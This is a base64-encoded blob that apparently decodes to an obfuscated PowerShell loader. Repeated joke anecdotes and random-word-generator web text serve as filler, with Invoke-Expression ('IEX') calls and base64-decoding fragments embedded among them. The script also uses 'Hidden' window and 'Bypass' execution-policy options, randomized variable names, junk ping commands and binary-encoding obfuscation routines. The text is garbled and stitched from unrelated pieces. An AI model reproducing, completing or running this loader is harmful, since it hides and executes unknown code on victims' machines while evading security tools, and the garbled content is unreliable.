8gbGVhdmUu4oCdU291cmNlIz4KPCNUaGF0cyBEZWRpY2F0aW9uU291cmNlIE9uZSB0aW1lIEkgYXRlIDI2IGNob2NvbGF0ZSBjaGlwIGkoKSBiZWNhdXNlIEkgd2FzIG1hZCBhdCBteSBsaXR0bGUgbCgpIGFuZCBkaWRudCB3YW50IGhlciB0byBoYXZlIGFueS4gSSBwdWtlZCBhbGwgb3ZlciB0aGUgcGxhY2Uu4oCdIFNvdXJjZSM+Cjwj4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgcmVzdHJvb20gSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CmZ1bmN0aW9uIDE1IHsKICAgIFBBUkFNKCAKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSldCiAgICAgICAgW29iamVjdF0kcmVjb3JkcywKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSldCiAgICAgICAgW3N0cmluZ10gJGxvZ2ljYWxuYW1lLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlKV0KICAgICAgICBbeG1sXSAkeG1sCiAgICApCiAgICAkcmVjb3Jkc2xpc3QgPSBOZXctT2JqZWN0ICdTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0W1N5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNPYmplY3RdJwogICAgZm9yZWFjaCgkcmVjb3JkIGluICRyZWNvcmRzLlZhbHVlcyl7ICAgCiAgICAgICAgJG51bGwgPSAkcmVjb3JkLkFkZCgib3JpZ2luYWwiLCRyZWNvcmQpCiAgICAgICAgJG51bGwgPSAkcmVjb3JkLkFkZCgibG9naWNhbG5hbWUiLCRsb2dpY2FsbmFtZSkKICAgICAgICBpZigkcmVjb3JkLkNvbnRhaW5zS2V5KCJSZXR1cm5Qcm9wZXJ0eV9JZCAiKSkKICAgICAgICB7CiAgICAgICAgICAgICRudWxsID0gJHJlY29yZC5BZGQoIlJldHVyblByb3BlcnR5X0lkIiwkcmVjb3JkLidSZXR1cm5Qcm9wZXJ0eV9JZCAnKQogICAgICAgICAgICAkbnVsbCA9ICRyZWNvcmQuUmVtb3ZlKCJSZXR1cm5Qcm9wZXJ0eV9JZCAiKQogICAgICAgIH0KICAgICAgICAjYWRkIGVudGl0eVJlZmVyZW5jZXMgdmFsdWVzIGFzIHZhbHVlcyAKICAgICAgICBGb3JFYWNoKCRhdHRyaWJ1dGUgaW4gJHJlY29yZC5LZXlzfFNlbGVjdCkKICAgICAgICB7CiAgICAgICAgICAgIGlmKC1ub3QgJGF0dHJpYnV0ZS5FbmRzV2l0aCgiX1Byb3BlcnR5IikpIHsgY29udGludWUgfQogICAgICAgICAgICAKICAgICAgICAgICAgI2lmIGFsaWFzZWQgdmFsdWUgQlVUIGlmIGl0J3MgYW4gRW50aXR5UmVmLi4uIHRoZW4gaWdub3JlIGl0IAogICAgICAgICAgICBpZigkcmVjb3JkWyRhdHRyaWJ1dGVdLlZhbHVlIC1pcyBbTWljcm9zb2Z0LlhybS5TZGsuQWxpYXNlZFZhbHVlXSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWYoJHJlY29yZFskYXR0cmlidXRlXS5WYWx1ZS5WYWx1ZSAtaXNub3QgW01pY3Jvc29mdC5Ycm0uU2RrLkVudGl0eVJlZmVyZW5jZV0pCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJGF0dE5hbWUgPSAkYXR0cmlidXRlLlJlcGxhY2UoIl9Qcm9wZXJ0eSIsIiIpCiAgICAgICAgICAgICAgICAgICAgJHJlY29yZFskYXR0TmFtZV0gPSAkcmVjb3JkWyRhdHRyaWJ1dGVdLlZhbHVlLlZhbHVlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmKCRyZWNvcmRbJGF0dHJpYnV0ZV0uVmFsdWUgLWlzIFtNaWNyb3NvZnQuWHJtLlNkay5FbnRpdHlSZWZlcmVuY2VdKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkYXR0TmFtZSA9ICRhdHRyaWJ1dGUuUmVwbGFjZSgiX1Byb3BlcnR5IiwiIikKICAgICAgICAgICAgICAgICRyZWNvcmRbJGF0dE5hbWVdID0gJHJlY29yZFskYXR0cmlidXRlXS5WYWx1ZS5OYW1lCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgIAogICAgICAgICRoYXNodGFibGUgPSAkcmVjb3JkIC1hcyBbSGFzaHRhYmxlXQoKICAgICAgICAjYWRkaW5nIER5bmFtaWMgRW50aXR5UmVmZXJlbmNlCiAgICAgICAgaWYgKCRoYXNodGFibGUuUmV0dXJuUHJvcGVydHlfSWQgLWFuZCAkaGFzaHRhYmxlLlJldHVyblByb3BlcnR5X0VudGl0eU5hbWUpIHsKICAgICAgICAgICAgJGhhc2h0YWJsZS5FbnRpdHlSZWZlcmVuY2UgPSBOZXctQ3JtRW50aXR5UmVmZXJlbmNlIC1FbnRpdHlMb2dpY2FsTmFtZSAkaGFzaHRhYmxlLlJldHVyblByb3BlcnR5X0VudGl0eU5hbWUgLUlkICRoYXNodGFibGUuUmV0dXJuUHJvcGVydHlfSWQKICAgICAgICB9CgogICAgICAgICRyZWNvcmRzbGlzdC5BZGQoW3BzY3VzdG9tb2JqZWN0XSRoYXNodGFibGUpCiAgICB9CiAgICAkcmVjb3Jkc2xpc3QKfQo8Iz4+ClNwPWVsbGluZyBhbmQgZCgpClRoaXMgdG9vbCBjYW4gYmUgYW4gZXhjZWxsZW50IHdheSB0byBpbXByb3ZlIGQoKSBvciBwcmFjdGljZSBmb3IgcigpIGJlZXMuIElmIGFuIHEoKSB3b3JkIG8oKSwgcCgpIHVwIHRoZSBtZWFuaW5nIHdpbGwgaGVscCBzdHVkZW50cyBpbmNyZWFzZSB0aGUgbnVtYmVyIG9mIHdvcmRzIHRoZXkga25vdy4gV29ya2luZyB3aXRoIGEgcGFydG5lciwgc3R1ZGVudHMgY2FuIHRlc3QgZWFjaCBvdGhlciBvbiB0aGUgcigpIGZvciB0aGUgcmFuZG9taXplZCB3b3JkcyBtKClkLgoKTmFtZSBJbnNwaXJhdGlvbgpJZiB5b3UgbmVlZCB0byBjcmVhdGUgYSBuYW1lIGZvciBhIHByb2R1Y3QsIGFuIGV2ZW50LCBhIGJhbmQgb3IgZm9yIGFueXRoaW5nIGVsc2UsIHRoaXMgdG9vbCBjYW4gYmUgcXVpdGUgaGVscGZ1bC4gQXMgeW91IGNvbnNpZGVyIG5hbWVzLCBtKCkgYSBudW1iZXIgb2YgcmFuZG9tIHdvcmRzIGFuZCBzZWUgaG93IHRoZXkgaW1wYWN0IHdoYXQgeW91IGhhdmUgYWxyZWFkeSBjb21lIHVwIHdpdGguIElucHV0dGluZyB1bmlxdWUgd29yZHMgeW91IG1heSBub3QgaGF2ZSBjb25zaWRlcmVkIGNhbiBzcGFyayBhZGRpdGlvbmFsIGNyZWF0aXZpdHkgdG8gZXZlbnR1YWxseSBoZWxwIHlvdSBwcm9kdWNlIHRoZSBwZXJmZWN0IG5hbWUgZm9yIHlvdXIgcHJvamVjdC4gSWYgeW91J3JlIHAoKSBmb3IgZ29vZCBjaGFyYWN0ZXIgbmFtZXMgb3IgYmFieSBuYW1lcywgeW91IG1pZ2h0IGJlIGludGVyZXN0ZWQgaW4gb3VyIHJhbmRvbSBuYW1lIGdlbmVyYXRvci4KClRoZSBhYm92ZSBsaXN0IGlzIG5vdCBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKC4gVGhlcmUgYXJlIGxpdGVyYWxseSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCBvZiB3YXlzIHRoZSBSYW5kb20gV29yZCBHZW5lcmF0b3IgY2FuIGJlIHVzZWQuIFBsZWFzZSBmZWVsIGZyZWUgdG8gc2hhcmUgdGhlIHdheSB5b3UgdXNlIHRoaXMgdG9vbCwgYW5kIHdlIGFsd2F5cyB3ZWxjb21lIHN1Z2dlc3Rpb25zIG9uIGhvdyB3ZSBjYW4gaW1wcm92ZSBpdCB0byBzZXJ2ZSB5b3UgYmV0dGVyLiBXZSBhcmUgYWxzbyBpbnRlcmVzdGVkIGluIG5ldyB3b3JkIGdlbmVyYXRvcnMgeW91J2QgYmUgaW50ZXJlc3RlZCBpbiB1cyBjcmVhdGluZy4gTWFueSBvZiB0aGUgdG9vbHMgb24gdGhpcyB3ZWJzaXRlIGNhbWUgZnJvbSBpZGVhcyBmcm9tIHBlb3BsZSBsaWtlIHlvdSB3aG8gY29udGFjdGVkIHVzLiBQbGVhc2UgdGFrZSB0aGUgdGltZSB0byBleHBsb3JlIHRoZSBvdGhlciByYW5kb20gZ2VuZXJhdG9ycyB3ZSBoYXZlIGF2YWlsCgojPjwjPuKAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIHJlc3Ryb29tIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCM+IElFWCAkV1VKSkV5Q2lnQ0lLV3JnbHggPCMgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KPCM+4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgcmVzdHJvb20gSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CjwjPuKAnEkgd2FzIGF0IGEgc3dhbmsgYmFyIGZvciBhIHdvcmsgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygsIFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoIHNvbWUgZ3JhZCBzdHVkZW50cyB3ZSBqKCkgZm9yIGFuIGYoKSBwcm9ncmFtLiBBZnRlciB3ZSBoYWQgYWxsIGhhZCBrKCkgZHJpbmtzLCBvbmUgb2YgdGhlIHN0dWRlbnRzIHNhaWQgdGhleSBkb250IGxpa2Ugc21va2VzIGJlY2F1c2UgdGhleSB0YXN0ZSBsaWtlIGEuIE15IGJvc3MgcmVwbGllZCwgbWF5YmUgeW91IGhhdmVudCBoYWQgZ29vZCBzbW9rZXMuIFNvIEkgY3V0IGluLCBtYXliZSB5b3UgaGF2ZW50IGhhZCBnb29kIGEuIEkgd2FzIGFza2VkIHRvIGxlYXZlLuKAnVNvdXJjZSM+CjwjVGhhdHMgRGVkaWNhdGlvblNvdXJjZSBPbmUgdGltZSBJIGF0ZSAyNiBjaG9jb2xhdGUgY2hpcCBpKCkgYmVjYXVzZSBJIHdhcyBtYWQgYXQgbXkgbGl0dGxlIGwoKSBhbmQgZGlkbnQgd2FudCBoZXIgdG8gaGF2ZSBhbnkuIEkgcHVrZWQgYWxsIG92ZXIgdGhlIHBsYWNlLuKAnSBTb3VyY2UjPgo8I+KAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIHJlc3Ryb29tIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgpmdW5jdGlvbiAxNiB7Cglmb3JlYWNoKCRpIGluICRhcmdzKXsKCQlpZigkaSAtbmUgJG51bGwpewoJCQlyZXR1cm4gJGkKCQl9Cgl9Cn0KCgogICAgIFBpbmcgIiQoR2V0LVJhbmRvbSAtTWluaW11bSAxMCAtTWF4aW11bSAxMDApLiQoR2V0LVJhbmRvbSAtTWluaW11bSAxMCAtTWF4aW11bSAxMDAwKS4kKEdldC1SYW5kb20gLU1pbmltdW0gMTAgLU1heGltdW0gMTAwMCkuJChHZXQtUmFuZG9tIC1NaW5pbXVtIDEwIC1NYXhpbXVtIDEwMCkiIC1uIDE7UGluZyAiJChHZXQtUmFuZG9tIC1NaW5pbXVtIDEwIC1NYXhpbXVtIDEwMCkuJChHZXQtUmFuZG9tIC1NaW5pbXVtIDEwIC1NYXhpbXVtIDEwMDApLiQoR2V0LVJhbmRvbSAtTWluaW11bSAxMCAtTWF4aW11bSAxMDAwKS4kKEdldC1SYW5kb20gLU1pbmltdW0gMTAgLU1heGltdW0gMTAwKSIgLW4gMTtQaW5nICIkKEdldC1SYW5kb20gLU1pbmltdW0gMTAgLU1heGltdW0gMTAwKS4kKEdldC1SYW5kb20gLU1pbmltdW0gMTAgLU1heGltdW0gMTAwMCkuJChHZXQtUmFuZG9tIC1NaW5pbXVtIDEwIC1NYXhpbXVtIDEwMDApLiQoR2V0LVJhbmRvbSAtTWluaW11bSAxMCAtTWF4aW11bSAxMDApIiAtbiAxO1BpbmcgIiQoR2V0LVJhbmRvbSAtTWluaW11bSAxMCAtTWF4aW11bSAxMDApLiQoR2V0LVJhbmRvbSAtTWluaW11bSAxMCAtTWF4aW11bSAxMDAwKS4kKEdldC1SYW5kb20gLU1pbmltdW0gMTAgLU1heGltdW0gMTAwMCkuJChHZXQtUmFuZG9tIC1NaW5pbXVtIDEwIC1NYXhpbXVtIDEwMCkiIC1uIDE7UGluZyAiJChHZXQtUmFuZG9tIC1NaW5pbXVtIDEwIC1NYXhpbXVtIDEwMCkuJChHZXQtUmFuZG9tIC1NaW5pbXVtIDEwIC1NYXhpbXVtIDEwMDApLiQoR2V0LVJhbmRvbSAtTWluaW11bSAxMCAtTWF4aW11bSAxMDAwKS4kKEdldC1SYW5kb20gLU1pbmltdW0gMTAgLU1heGltdW0gMTAwKSIgLW4gMTtQaW5nICIkKEdldC1SYW5kb20gLU1pbmltdW0gMTAgLU1heGltdW0gMTAwKS4kKEdldC1SYW5kb20gLU1pbmltdW0gMTAgLU1heGltdW0gMTAwMCkuJChHZXQtUmFuZG9tIC1NaW5pbXVtIDEwIC1NYXhpbXVtIDEwMDApLiQoR2V0LVJhbmRvbSAtTWluaW11bSAxMCAtTWF4aW11bSAxMDApIiAtbiAxOwoKCgokcTV5eXB1N3lyQ3RnID0gQCIKICAgICAgICBbVmFsaWRhdGVTZXQoKFdVSkpFeUNpZ0NJS1dyZ2woJ05vcm1hbCcpKSwgKHdVSkplWUNJR0NpS1dyZ0woJ01pbmltaXplZCcpKSwgKHd1SmpFeUNJR0NpS3dyZ2woJ01heGltaXplZCcpKSwgKFd1akpFWUNJR2NJS1dyZ2woJ0hpZGRlbicpKSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkdHh5N3d4NzNTLAoKICAgICAgICBbVmFsaWRhdGVTZXQoKHdVakpFWUNpR0NJS3dSR0woJ0J5cGFzcycpKSwgKHd1akpFWWNJR0NJS3dyR2woJ1VucmVzdHJpY3RlZCcpKSwgKHdVSmpFWWNJR0NJa1dSZ2woJ1JlbW90ZVNpZ25lZCcpKSwgKHdVSkpFWUNpR2NpS1dyZ2woJ0FsbFNpZ25lZCcpKSwgKFd1ampFWUNJR0NJa3dSZ2woJ1Jlc3RyaWN0ZWQnKSkpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJG9pd1VhSWJ4dUxjc2hZLAogICAgICAgIAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJHlzdGtFSDlNUjFldUk3T2QzCiAgICApCgogICAgIyBFbmNvZGluZyBiYXNlIHZhbHVlczogMTY9SGV4LCA4PU9jdGFsLCAyPUJpbmFyeQogICAgJEdNZF9KTzhJQ0lwID0gMgogICAgIkBAIgogICAgIyBFaXRoZXIgY29udmVydCBTY3JpcHRCbG9jayB0byBhIFN0cmluZyBvciBjb252ZXJ0IHNjcmlwdCBhdCAkUGF0aCB0byBhIFN0cmluZy4KICAgIElmKCRUYlN0Q3BCUFZbKCd7MH17MX0nLWYnUGF0JywnaCcpXSkKICAgIHsKICAgICAgICBHZXQtQ2hpbGRJdGVtICRId2w0QlVDS1k5IC1FcnJvckFjdGlvbiBTdG9wIHwgT3V0LU51bGwKICAgICAgICAkUTd4QVFOcTFZODhlID0gW0lPLkZpbGVdOjpSZWFkQWxsVGV4dCgoUmVzb2x2ZS1QYXRoICRod2w0YnVjS1k5KSkKICAgIH0KICAgIEVsc2UKICAgIHsKICAgICAgICAkcTd4YVFOcTFZODhlID0gW1N0cmluZ10kbzlEZjBTUnB0ODNGNkJobzVpCiAgICB9CgogICAgIyBDcmVhdGUgbGlzdCBvZiByYW5kb20gZGVsaW1pdGVycyAkUmFuZG9tRGVsaW1pdGVycy4KICAgICMgQXZvaWQgdXNpbmcgLiAqICcgIiBbIF0gKCApIGV0Yy4gYXMgZGVsaW1pdGVycyBhcyB0aGVzZSB3aWxsIGNhdXNlIHByb2JsZW1zIGluIHRoZSAtU3BsaXQgY29tbWFuZCBzeW50YXguCiAgICAkYVZWUzhZMTJrdG1XX2Q1ICA9IEAoKFd1akpFeUNJR0NJS3dyR0woJ18nKSksKHdVSkpFWWNJR0NJa1dSR2woJy0nKSksKHd1akpleWNJR0NJS1dyZ0woJywnKSksKFd1akpFWUNJR0NJS3dSZ0woJ3snKSksKHdVakpleUNJZ2NJa1dSZ0woJ30nKSksKHdVSkpleUNJR0NJS1dSZ0woJ34nKSksKFdVakpFWWNJR2NpS1dyR0woJyEnKSksKFdVSkpFWUNpZ0NJa3dyR0woJ0AnKSksKHdVakplWUNJZ0NJa3dyZ0woJyUnKSksKFdVampleUNJZ2Npa1dyR2woJyYnKSksKHd1SkpFWUNJR0NJS3dyZ0woJzwnKSksKHdVakpFWWNJR0NJa1dyZ0woJz4nKSksKHd1SmpFWUNJR0NJS1dSZ2woJzsnKSksKHd1SkpFWWNJR2NpS1dyZ2woJzonKSkpCgogICAgIyBBZGQgbGV0dGVycyBhLXogd2l0aCByYW5kb20gY2FzZSB0byAkUmFuZG9tRGVsaW1pdGVycy4KICAgIEAoKFdVSkpFWUNJZ0NpS1dyZ2woJ2EnKSksKHd1SkpFWWNJR0NJa1dyR2woJ2InKSksKFd1ampFeWNJZ0NpS1dyR0woJ2MnKSksKHd1akpFWUNJZ2Npa3dyZ0woJ2QnKSksKFd1SmpFeUNJR0NJS3dyZ2woJ2UnKSksKHdVSkplWWNpZ0NJa1dyZ2woJ2YnKSksKFd1SkpFeWNJR0NJS1dSZ0woJ2cnKSksKHd1ampleWNpR2Npa1dyZ0woJ2gnKSksKHd1SkplWUNpR0NJS1dyZ2woJ2knKSksKHdVakpFWUNpZ2NJS3dSZ2woJ2onKSksKHdVampFWUNJZ0NJS1dSR0woJ2snKSksKHdVSkpFWUNpR0NJa1dyR0woJ2wnKSksKFd1SmplWWNJR2NJS1dyZ2woJ20nKSksKHdVamplWUNpR0NpS1dSR0woJ24nKSksKFd1SmpFWWNJZ0NJa3dyR2woJ28nKSksKHd1SkpFeWNJR0NpS3dyZ2woJ3AnKSksKFd1akplWUNJR2NJa3dyR0woJ3EnKSksKHdVSkpFeUNJZ0NJa1dSR2woJ3InKSksKHd1SkplWWNJR0NJS1dyZ0woJ3MnKSksKHd1ampFWUNJR2Npa1dSZ0woJ3QnKSksKFdVampFeUNpZ0NJa1dyR0woJ3UnKSksKHd1akpleWNJR2NJS1dyR2woJ3YnKSksKHd1akplWUNJR0NJS3dyZ0woJ3cnKSksKFd1SkplWWNJZ0NJa1dyZ0woJ3gnKSksKHdVakpleUNpZ0NpS1dyZ2woJ3knKSksKFdVSkpFWWNpR2Npa1dyZ2woJ3onKSkpIHwgRm9yRWFjaC1PYmplY3QgeyRRT2g3a1YxMUZSZVM2XzJuaSA9ICRfOyBJZigoKEdldC1SYW5kb20gLUlucHV0IEAoKDIgLSAxKS4uKDIgKyAoMSAtIDEpKSkpLSgzIC0gMikgLWVxIDApKSB7JFFPSDdLVjExRlJlUzZfMm5JID0gJHFPaDdrVjExRnJlUzZfMk5pLlRvVXBwZXIoKX0gJEFWdlM4eTEyS3RNd19kNSArPSAkUU9IN0t2MTFmUmVTNl8yTkl9CiAgICAiQEAiCiAgICAjIE9ubHkgdXNlIGEgc3Vic2V0IG9mIGN1cnJlbnQgZGVsaW1pdGVycyB0byByYW5kb21pemUgd2hhdCB5b3Ugc2VlIGluIGV2ZXJ5IGl0ZXJhdGlvbiBvZiB0aGlzIHNjcmlwdCdzIG91dHB1dC4KICAgICRBVlZzOHkxMktUbXdfZDUgPSAoR2V0LVJhbmRvbSAtSW5wdXQgJEF2dlM4eTEya1RNV19kNSAtQ291bnQgKCRBdnZTOFkxMmt0bVdfZDUuQ291bnQvKDIgKyAyKSkpCgogICAgIyBDb252ZXJ0ICRTY3JpcHRTdHJpbmcgdG8gZGVsaW1pdGVkIEJpbmFyeSB2YWx1ZXMgaW4gW0NoYXJdIGFycmF5IHNlcGFyYXRlZCBieSByYW5kb20gZGVsaW1pdGVyIGZyb20gZGVmaW5lZCBsaXN0ICRSYW5kb2